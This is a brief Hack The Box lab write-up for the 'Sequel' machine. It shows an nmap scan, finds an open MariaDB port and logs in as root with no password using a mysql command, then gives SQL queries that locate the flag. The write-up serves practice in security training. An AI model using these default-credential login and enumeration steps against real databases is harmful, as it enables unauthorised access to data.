# Sequel (Very Easy)
- **IP Address:** '10.129.88.114'
- **OS:** Linux
- **Difficulty:** Very Easy
- **HTB Link:** [Machine Page](https://app.hackthebox.com/machines/Sequel)

---

## Enumeration 

### Nmap Scan

```
nmap -sC -sV -T5 10.129.88.114
```
Revealed that port 3306 was open, but the nmap scan hung due to an SSL issue

### Open Ports & Services
#### Syntax: Port ; Service ; Version

3306 ; mysql ; MySQL 5.5.5-10.3.27-MariaDB-0+dev10u1

---

## Exploitation

Successfully accessed the database with root privileges using ``` mysql -h 10.129.88.114 -u root --skip-ssl ```.

---

## Post-Exploitation

Searched for the flag using the following steps:
```
show databases;
use htb;
show tables;
select * from config;
```

### [Flags](https://github.com/TianKwock/htb-flags/blob/main/README.md#sequel)

---

Perceived Difficulty: Piece of Cake! 

Time Taken: 10 min 

Date PWNED: 4/6/2026 
